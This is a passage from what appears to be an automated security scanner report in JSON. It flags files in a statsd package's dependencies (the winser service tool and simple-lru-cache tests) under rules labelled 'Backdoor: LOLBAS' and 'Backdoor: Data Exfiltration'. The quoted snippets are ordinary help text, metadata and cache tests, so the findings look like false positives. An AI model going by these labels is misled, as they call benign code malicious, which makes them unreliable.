                    "text": "    -h, --help          output usage information\n    -V, --version       output the version number\n    -i, --install       install the node application as a windows service\n    -r, --remove        remove the windows service for the node application\n    -x, --stop          stop the service before uninstalling\n    -s, --silent        supress any information in the console\n    -c, --confirmation  ask for confirmation before installing/uninstalling\n",
                    "rendered": {
                      "text": "    -h, --help          output usage information\n    -V, --version       output the version number\n    -i, --install       install the node application as a windows service\n    -r, --remove        remove the windows service for the node application\n    -x, --stop          stop the service before uninstalling\n    -s, --silent        supress any information in the console\n    -c, --confirmation  ask for confirmation before installing/uninstalling\n",
                      "markdown": "`    -h, --help          output usage information\n    -V, --version       output the version number\n    -i, --install       install the node application as a windows service\n    -r, --remove        remove the windows service for the node application\n    -x, --stop          stop the service before uninstalling\n    -s, --silent        supress any information in the console\n    -c, --confirmation  ask for confirmation before installing/uninstalling\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/winser/readme.md"
                },
                "region": {
                  "startLine": 13,
                  "startColumn": 65,
                  "endLine": 14,
                  "snippet": {
                    "text": "  \n    -h, --help          output usage information\n    -V, --version       output the version number\n    -i, --install       install the node application as a windows service\n    -r, --remove        remove the windows service for the node application\n    -x, --stop          stop the service before uninstalling\n    -s, --silent        supress any information in the console\n    -c, --confirmation  ask for confirmation before installing/uninstalling\n",
                    "rendered": {
                      "text": "  \n    -h, --help          output usage information\n    -V, --version       output the version number\n    -i, --install       install the node application as a windows service\n    -r, --remove        remove the windows service for the node application\n    -x, --stop          stop the service before uninstalling\n    -s, --silent        supress any information in the console\n    -c, --confirmation  ask for confirmation before installing/uninstalling\n",
                      "markdown": "`  \n    -h, --help          output usage information\n    -V, --version       output the version number\n    -i, --install       install the node application as a windows service\n    -r, --remove        remove the windows service for the node application\n    -x, --stop          stop the service before uninstalling\n    -s, --silent        supress any information in the console\n    -c, --confirmation  ask for confirmation before installing/uninstalling\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/winser/readme.md"
                },
                "region": {
                  "startLine": 13,
                  "startColumn": 35,
                  "endLine": 13,
                  "endColumn": 41,
                  "snippet": {
                    "text": "  \n    -h, --help          output usage information\n    -V, --version       output the version number\n    -i, --install       install the node application as a windows service\n    -r, --remove        remove the windows service for the node application\n    -x, --stop          stop the service before uninstalling\n    -s, --silent        supress any information in the console\n",
                    "rendered": {
                      "text": "  \n    -h, --help          output usage information\n    -V, --version       output the version number\n    -i, --install       install the node application as a windows service\n    -r, --remove        remove the windows service for the node application\n    -x, --stop          stop the service before uninstalling\n    -s, --silent        supress any information in the console\n",
                      "markdown": "`  \n    -h, --help          output usage information\n    -V, --version       output the version number\n    -i, --install       install the node application as a windows service\n    -r, --remove        remove the windows service for the node application\n    -x, --stop          stop the service before uninstalling\n    -s, --silent        supress any information in the console\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/winser/package.json"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 55,
                  "endLine": 4,
                  "endColumn": 64,
                  "snippet": {
                    "text": "{\n  \"name\": \"winser\",\n  \"version\": \"0.1.6\",\n  \"description\": \"Run a node.js application as a window service using nssm.\",\n  \"keywords\": [\n    \"windows\",\n    \"services\",\n",
                    "rendered": {
                      "text": "{\n  \"name\": \"winser\",\n  \"version\": \"0.1.6\",\n  \"description\": \"Run a node.js application as a window service using nssm.\",\n  \"keywords\": [\n    \"windows\",\n    \"services\",\n",
                      "markdown": "`{\n  \"name\": \"winser\",\n  \"version\": \"0.1.6\",\n  \"description\": \"Run a node.js application as a window service using nssm.\",\n  \"keywords\": [\n    \"windows\",\n    \"services\",\n`"
                    }
                  },
                  "sourceLanguage": "package.json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/winser/bin/winser"
                },
                "region": {
                  "startLine": 121,
                  "startColumn": 28,
                  "endLine": 121,
                  "endColumn": 37,
                  "snippet": {
                    "text": "                if(stderr){\n                    !program.silent && console.error(stderr);\n                }else{\n                    log(\"The service for {serviceName} was removed.\".supplant({serviceName: appName}));\n                }\n                next(); \n            });\n",
                    "rendered": {
                      "text": "                if(stderr){\n                    !program.silent && console.error(stderr);\n                }else{\n                    log(\"The service for {serviceName} was removed.\".supplant({serviceName: appName}));\n                }\n                next(); \n            });\n",
                      "markdown": "`                if(stderr){\n                    !program.silent && console.error(stderr);\n                }else{\n                    log(\"The service for {serviceName} was removed.\".supplant({serviceName: appName}));\n                }\n                next(); \n            });\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/winser/bin/winser"
                },
                "region": {
                  "startLine": 46,
                  "startColumn": 46,
                  "endLine": 46,
                  "endColumn": 52,
                  "snippet": {
                    "text": "}\n\nif (!(fs.existsSync||path.existsSync)(path.join(program.path, \"package.json\"))){\n    log(program.path + \" doesn't seems to be a node application path.\\nIt doesn't contains a package.json file.\");\n    process.exit();\n    return;\n}\n",
                    "rendered": {
                      "text": "}\n\nif (!(fs.existsSync||path.existsSync)(path.join(program.path, \"package.json\"))){\n    log(program.path + \" doesn't seems to be a node application path.\\nIt doesn't contains a package.json file.\");\n    process.exit();\n    return;\n}\n",
                      "markdown": "`}\n\nif (!(fs.existsSync||path.existsSync)(path.join(program.path, \"package.json\"))){\n    log(program.path + \" doesn't seems to be a node application path.\\nIt doesn't contains a package.json file.\");\n    process.exit();\n    return;\n}\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/winser/bin/winser"
                },
                "region": {
                  "startLine": 25,
                  "startColumn": 85,
                  "endLine": 25,
                  "endColumn": 94,
                  "snippet": {
                    "text": "  .option(\"-x, --stop\",  \"stop the service before uninstalling\")\n  .option(\"-s, --silent\",  \"supress any information in the console\")\n  .option(\"-c, --confirmation\", \"ask for confirmation before installing/uninstalling\")\n  .option(\"-p, --path [path]\", \"path to the node application you want to install as a service [current directory]\", process.cwd())\n  .parse(process.argv);\n\nfunction log(message){\n",
                    "rendered": {
                      "text": "  .option(\"-x, --stop\",  \"stop the service before uninstalling\")\n  .option(\"-s, --silent\",  \"supress any information in the console\")\n  .option(\"-c, --confirmation\", \"ask for confirmation before installing/uninstalling\")\n  .option(\"-p, --path [path]\", \"path to the node application you want to install as a service [current directory]\", process.cwd())\n  .parse(process.argv);\n\nfunction log(message){\n",
                      "markdown": "`  .option(\"-x, --stop\",  \"stop the service before uninstalling\")\n  .option(\"-s, --silent\",  \"supress any information in the console\")\n  .option(\"-c, --confirmation\", \"ask for confirmation before installing/uninstalling\")\n  .option(\"-p, --path [path]\", \"path to the node application you want to install as a service [current directory]\", process.cwd())\n  .parse(process.argv);\n\nfunction log(message){\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/winser/bin/winser"
                },
                "region": {
                  "startLine": 25,
                  "startColumn": 43,
                  "endLine": 25,
                  "endColumn": 49,
                  "snippet": {
                    "text": "  .option(\"-x, --stop\",  \"stop the service before uninstalling\")\n  .option(\"-s, --silent\",  \"supress any information in the console\")\n  .option(\"-c, --confirmation\", \"ask for confirmation before installing/uninstalling\")\n  .option(\"-p, --path [path]\", \"path to the node application you want to install as a service [current directory]\", process.cwd())\n  .parse(process.argv);\n\nfunction log(message){\n",
                    "rendered": {
                      "text": "  .option(\"-x, --stop\",  \"stop the service before uninstalling\")\n  .option(\"-s, --silent\",  \"supress any information in the console\")\n  .option(\"-c, --confirmation\", \"ask for confirmation before installing/uninstalling\")\n  .option(\"-p, --path [path]\", \"path to the node application you want to install as a service [current directory]\", process.cwd())\n  .parse(process.argv);\n\nfunction log(message){\n",
                      "markdown": "`  .option(\"-x, --stop\",  \"stop the service before uninstalling\")\n  .option(\"-s, --silent\",  \"supress any information in the console\")\n  .option(\"-c, --confirmation\", \"ask for confirmation before installing/uninstalling\")\n  .option(\"-p, --path [path]\", \"path to the node application you want to install as a service [current directory]\", process.cwd())\n  .parse(process.argv);\n\nfunction log(message){\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/winser/bin/winser"
                },
                "region": {
                  "startLine": 22,
                  "startColumn": 34,
                  "endLine": 22,
                  "endColumn": 43,
                  "snippet": {
                    "text": "  .version(require(\"../package.json\").version)\n  .option(\"-i, --install\", \"install the node application as a windows service\")\n  .option(\"-r, --remove\",  \"remove the windows service for the node application\")\n  .option(\"-x, --stop\",  \"stop the service before uninstalling\")\n  .option(\"-s, --silent\",  \"supress any information in the console\")\n  .option(\"-c, --confirmation\", \"ask for confirmation before installing/uninstalling\")\n  .option(\"-p, --path [path]\", \"path to the node application you want to install as a service [current directory]\", process.cwd())\n",
                    "rendered": {
                      "text": "  .version(require(\"../package.json\").version)\n  .option(\"-i, --install\", \"install the node application as a windows service\")\n  .option(\"-r, --remove\",  \"remove the windows service for the node application\")\n  .option(\"-x, --stop\",  \"stop the service before uninstalling\")\n  .option(\"-s, --silent\",  \"supress any information in the console\")\n  .option(\"-c, --confirmation\", \"ask for confirmation before installing/uninstalling\")\n  .option(\"-p, --path [path]\", \"path to the node application you want to install as a service [current directory]\", process.cwd())\n",
                      "markdown": "`  .version(require(\"../package.json\").version)\n  .option(\"-i, --install\", \"install the node application as a windows service\")\n  .option(\"-r, --remove\",  \"remove the windows service for the node application\")\n  .option(\"-x, --stop\",  \"stop the service before uninstalling\")\n  .option(\"-s, --silent\",  \"supress any information in the console\")\n  .option(\"-c, --confirmation\", \"ask for confirmation before installing/uninstalling\")\n  .option(\"-p, --path [path]\", \"path to the node application you want to install as a service [current directory]\", process.cwd())\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/winser/bin/winser"
                },
                "region": {
                  "startLine": 21,
                  "startColumn": 62,
                  "endLine": 21,
                  "endColumn": 68,
                  "snippet": {
                    "text": "program\n  .version(require(\"../package.json\").version)\n  .option(\"-i, --install\", \"install the node application as a windows service\")\n  .option(\"-r, --remove\",  \"remove the windows service for the node application\")\n  .option(\"-x, --stop\",  \"stop the service before uninstalling\")\n  .option(\"-s, --silent\",  \"supress any information in the console\")\n  .option(\"-c, --confirmation\", \"ask for confirmation before installing/uninstalling\")\n",
                    "rendered": {
                      "text": "program\n  .version(require(\"../package.json\").version)\n  .option(\"-i, --install\", \"install the node application as a windows service\")\n  .option(\"-r, --remove\",  \"remove the windows service for the node application\")\n  .option(\"-x, --stop\",  \"stop the service before uninstalling\")\n  .option(\"-s, --silent\",  \"supress any information in the console\")\n  .option(\"-c, --confirmation\", \"ask for confirmation before installing/uninstalling\")\n",
                      "markdown": "`program\n  .version(require(\"../package.json\").version)\n  .option(\"-i, --install\", \"install the node application as a windows service\")\n  .option(\"-r, --remove\",  \"remove the windows service for the node application\")\n  .option(\"-x, --stop\",  \"stop the service before uninstalling\")\n  .option(\"-s, --silent\",  \"supress any information in the console\")\n  .option(\"-c, --confirmation\", \"ask for confirmation before installing/uninstalling\")\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/winser/bin/winser"
                },
                "region": {
                  "startLine": 21,
                  "startColumn": 46,
                  "endLine": 21,
                  "endColumn": 55,
                  "snippet": {
                    "text": "program\n  .version(require(\"../package.json\").version)\n  .option(\"-i, --install\", \"install the node application as a windows service\")\n  .option(\"-r, --remove\",  \"remove the windows service for the node application\")\n  .option(\"-x, --stop\",  \"stop the service before uninstalling\")\n  .option(\"-s, --silent\",  \"supress any information in the console\")\n  .option(\"-c, --confirmation\", \"ask for confirmation before installing/uninstalling\")\n",
                    "rendered": {
                      "text": "program\n  .version(require(\"../package.json\").version)\n  .option(\"-i, --install\", \"install the node application as a windows service\")\n  .option(\"-r, --remove\",  \"remove the windows service for the node application\")\n  .option(\"-x, --stop\",  \"stop the service before uninstalling\")\n  .option(\"-s, --silent\",  \"supress any information in the console\")\n  .option(\"-c, --confirmation\", \"ask for confirmation before installing/uninstalling\")\n",
                      "markdown": "`program\n  .version(require(\"../package.json\").version)\n  .option(\"-i, --install\", \"install the node application as a windows service\")\n  .option(\"-r, --remove\",  \"remove the windows service for the node application\")\n  .option(\"-x, --stop\",  \"stop the service before uninstalling\")\n  .option(\"-s, --silent\",  \"supress any information in the console\")\n  .option(\"-c, --confirmation\", \"ask for confirmation before installing/uninstalling\")\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/winser/bin/winser"
                },
                "region": {
                  "startLine": 20,
                  "startColumn": 39,
                  "endLine": 20,
                  "endColumn": 45,
                  "snippet": {
                    "text": "\nprogram\n  .version(require(\"../package.json\").version)\n  .option(\"-i, --install\", \"install the node application as a windows service\")\n  .option(\"-r, --remove\",  \"remove the windows service for the node application\")\n  .option(\"-x, --stop\",  \"stop the service before uninstalling\")\n  .option(\"-s, --silent\",  \"supress any information in the console\")\n",
                    "rendered": {
                      "text": "\nprogram\n  .version(require(\"../package.json\").version)\n  .option(\"-i, --install\", \"install the node application as a windows service\")\n  .option(\"-r, --remove\",  \"remove the windows service for the node application\")\n  .option(\"-x, --stop\",  \"stop the service before uninstalling\")\n  .option(\"-s, --silent\",  \"supress any information in the console\")\n",
                      "markdown": "`\nprogram\n  .version(require(\"../package.json\").version)\n  .option(\"-i, --install\", \"install the node application as a windows service\")\n  .option(\"-r, --remove\",  \"remove the windows service for the node application\")\n  .option(\"-x, --stop\",  \"stop the service before uninstalling\")\n  .option(\"-s, --silent\",  \"supress any information in the console\")\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/winser/bin/winser"
                },
                "region": {
                  "startLine": 1,
                  "startColumn": 14,
                  "endLine": 2,
                  "snippet": {
                    "text": "#!/usr/bin/env node\n\nvar fs = require(\"fs\"),\n    exec = require(\"child_process\").exec,\n    sequence = require(\"sequence\")(), \n",
                    "rendered": {
                      "text": "#!/usr/bin/env node\n\nvar fs = require(\"fs\"),\n    exec = require(\"child_process\").exec,\n    sequence = require(\"sequence\")(), \n",
                      "markdown": "`#!/usr/bin/env node\n\nvar fs = require(\"fs\"),\n    exec = require(\"child_process\").exec,\n    sequence = require(\"sequence\")(), \n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/simple-lru-cache/test/simple_lru_tests.js"
                },
                "region": {
                  "startLine": 60,
                  "startColumn": 17,
                  "endLine": 60,
                  "endColumn": 22,
                  "snippet": {
                    "text": "        })\n\n        for(var i = 0; i < 100; i++)\n            cache.get(i).should.equal(\"value_\"+i+\"_modif\")\n    }) \n})\n",
                    "rendered": {
                      "text": "        })\n\n        for(var i = 0; i < 100; i++)\n            cache.get(i).should.equal(\"value_\"+i+\"_modif\")\n    }) \n})\n",
                      "markdown": "`        })\n\n        for(var i = 0; i < 100; i++)\n            cache.get(i).should.equal(\"value_\"+i+\"_modif\")\n    }) \n})\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/simple-lru-cache/test/simple_lru_tests.js"
                },
                "region": {
                  "startLine": 47,
                  "startColumn": 30,
                  "endLine": 47,
                  "endColumn": 35,
                  "snippet": {
                    "text": "        cache.del(\"b\")\n        cache.size.should.equal(2)\n        Object.keys(cache.cache).length.should.equal(2)\n        should.not.exist(cache.get(\"b\"))\n    })\n    it(\"Should provide a way to list all objects\",function(){\n        var cache = new SimpleCache({maxSize:100})\n",
                    "rendered": {
                      "text": "        cache.del(\"b\")\n        cache.size.should.equal(2)\n        Object.keys(cache.cache).length.should.equal(2)\n        should.not.exist(cache.get(\"b\"))\n    })\n    it(\"Should provide a way to list all objects\",function(){\n        var cache = new SimpleCache({maxSize:100})\n",
                      "markdown": "`        cache.del(\"b\")\n        cache.size.should.equal(2)\n        Object.keys(cache.cache).length.should.equal(2)\n        should.not.exist(cache.get(\"b\"))\n    })\n    it(\"Should provide a way to list all objects\",function(){\n        var cache = new SimpleCache({maxSize:100})\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/simple-lru-cache/test/simple_lru_tests.js"
                },
                "region": {
                  "startLine": 43,
                  "startColumn": 13,
                  "endLine": 43,
                  "endColumn": 18,
                  "snippet": {
                    "text": "        cache.set(\"b\",\"2\")\n        cache.set(\"c\",\"3\")\n        cache.size.should.equal(3)\n        cache.get(\"b\").should.equal(\"2\")\n        cache.del(\"b\")\n        cache.size.should.equal(2)\n        Object.keys(cache.cache).length.should.equal(2)\n",
                    "rendered": {
                      "text": "        cache.set(\"b\",\"2\")\n        cache.set(\"c\",\"3\")\n        cache.size.should.equal(3)\n        cache.get(\"b\").should.equal(\"2\")\n        cache.del(\"b\")\n        cache.size.should.equal(2)\n        Object.keys(cache.cache).length.should.equal(2)\n",
                      "markdown": "`        cache.set(\"b\",\"2\")\n        cache.set(\"c\",\"3\")\n        cache.size.should.equal(3)\n        cache.get(\"b\").should.equal(\"2\")\n        cache.del(\"b\")\n        cache.size.should.equal(2)\n        Object.keys(cache.cache).length.should.equal(2)\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/simple-lru-cache/test/simple_lru_tests.js"
                },
                "region": {
                  "startLine": 24,
                  "startColumn": 30,
                  "endLine": 24,
                  "endColumn": 35,
                  "snippet": {
                    "text": "        cache.set(\"e\",\"5\")\n        cache.get(\"b\").should.equal(\"2\")\n        cache.get(\"e\").should.equal(\"5\")\n        should.not.exist(cache.get(\"c\"))\n    })\n    it(\"Should remove all objects on reset\",function(){\n        var cache = new SimpleCache({maxSize:3})\n",
                    "rendered": {
                      "text": "        cache.set(\"e\",\"5\")\n        cache.get(\"b\").should.equal(\"2\")\n        cache.get(\"e\").should.equal(\"5\")\n        should.not.exist(cache.get(\"c\"))\n    })\n    it(\"Should remove all objects on reset\",function(){\n        var cache = new SimpleCache({maxSize:3})\n",
                      "markdown": "`        cache.set(\"e\",\"5\")\n        cache.get(\"b\").should.equal(\"2\")\n        cache.get(\"e\").should.equal(\"5\")\n        should.not.exist(cache.get(\"c\"))\n    })\n    it(\"Should remove all objects on reset\",function(){\n        var cache = new SimpleCache({maxSize:3})\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/simple-lru-cache/test/simple_lru_tests.js"
                },
                "region": {
                  "startLine": 23,
                  "startColumn": 13,
                  "endLine": 23,
                  "endColumn": 18,
                  "snippet": {
                    "text": "        cache.get(\"b\")\n        cache.set(\"e\",\"5\")\n        cache.get(\"b\").should.equal(\"2\")\n        cache.get(\"e\").should.equal(\"5\")\n        should.not.exist(cache.get(\"c\"))\n    })\n    it(\"Should remove all objects on reset\",function(){\n",
                    "rendered": {
                      "text": "        cache.get(\"b\")\n        cache.set(\"e\",\"5\")\n        cache.get(\"b\").should.equal(\"2\")\n        cache.get(\"e\").should.equal(\"5\")\n        should.not.exist(cache.get(\"c\"))\n    })\n    it(\"Should remove all objects on reset\",function(){\n",
                      "markdown": "`        cache.get(\"b\")\n        cache.set(\"e\",\"5\")\n        cache.get(\"b\").should.equal(\"2\")\n        cache.get(\"e\").should.equal(\"5\")\n        should.not.exist(cache.get(\"c\"))\n    })\n    it(\"Should remove all objects on reset\",function(){\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/simple-lru-cache/test/simple_lru_tests.js"
                },
                "region": {
                  "startLine": 22,
                  "startColumn": 13,
                  "endLine": 22,
                  "endColumn": 18,
                  "snippet": {
                    "text": "        should.not.exist(cache.get(\"a\"))\n        cache.get(\"b\")\n        cache.set(\"e\",\"5\")\n        cache.get(\"b\").should.equal(\"2\")\n        cache.get(\"e\").should.equal(\"5\")\n        should.not.exist(cache.get(\"c\"))\n    })\n",
                    "rendered": {
                      "text": "        should.not.exist(cache.get(\"a\"))\n        cache.get(\"b\")\n        cache.set(\"e\",\"5\")\n        cache.get(\"b\").should.equal(\"2\")\n        cache.get(\"e\").should.equal(\"5\")\n        should.not.exist(cache.get(\"c\"))\n    })\n",
                      "markdown": "`        should.not.exist(cache.get(\"a\"))\n        cache.get(\"b\")\n        cache.set(\"e\",\"5\")\n        cache.get(\"b\").should.equal(\"2\")\n        cache.get(\"e\").should.equal(\"5\")\n        should.not.exist(cache.get(\"c\"))\n    })\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/simple-lru-cache/test/simple_lru_tests.js"
                },
                "region": {
                  "startLine": 20,
                  "startColumn": 13,
                  "endLine": 20,
                  "endColumn": 18,
                  "snippet": {
                    "text": "        cache.set(\"d\",\"4\")\n        cache.get(\"d\").should.equal(\"4\")\n        should.not.exist(cache.get(\"a\"))\n        cache.get(\"b\")\n        cache.set(\"e\",\"5\")\n        cache.get(\"b\").should.equal(\"2\")\n        cache.get(\"e\").should.equal(\"5\")\n",
                    "rendered": {
                      "text": "        cache.set(\"d\",\"4\")\n        cache.get(\"d\").should.equal(\"4\")\n        should.not.exist(cache.get(\"a\"))\n        cache.get(\"b\")\n        cache.set(\"e\",\"5\")\n        cache.get(\"b\").should.equal(\"2\")\n        cache.get(\"e\").should.equal(\"5\")\n",
                      "markdown": "`        cache.set(\"d\",\"4\")\n        cache.get(\"d\").should.equal(\"4\")\n        should.not.exist(cache.get(\"a\"))\n        cache.get(\"b\")\n        cache.set(\"e\",\"5\")\n        cache.get(\"b\").should.equal(\"2\")\n        cache.get(\"e\").should.equal(\"5\")\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
